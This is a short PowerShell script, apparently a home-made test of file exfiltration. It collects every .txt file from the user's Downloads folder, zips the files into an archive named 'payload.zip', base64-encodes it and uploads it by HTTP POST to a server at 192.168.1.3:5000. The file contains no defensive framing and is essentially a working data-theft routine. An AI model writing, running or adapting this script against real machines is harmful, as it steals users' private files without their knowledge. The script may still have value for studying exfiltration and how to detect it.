$username = $env:USERNAME
$path = "C:\Users\$username/Downloads"
$cont = Get-ChildItem $path -Recurse -Filter *.txt

#$directories = $cont.DirectoryName | Sort-Object -Unique

foreach ($file in $cont) {
    Copy-Item -Path $file.FullName -Destination 'C://Users/semne/Downloads/novo'
}

Compress-Archive `
    -Path "C://Users/semne/Downloads/novo" `
    -DestinationPath "C:\Users\semne\Downloads\antigo\payload.zip"

$file = [System.IO.File]::ReadAllBytes("C:\Users\semne\Downloads\antigo\payload.zip")
$encoded = [Convert]::ToBase64String($file)
#$encoded | Set-Content "C:\Users\semne\Downloads\HarmlessFolder\encoded.txt" -NoNewline


#$encodedText = Get-Content "C:\Users\semne\Downloads\HarmlessFolder\encoded.txt"
#Write-Output = $encodedText

Invoke-WebRequest `
    -Uri "http://192.168.1.3:5000/upload" `
    -Method POST `
    -Body $encoded`
    -ContentType "text/plain"
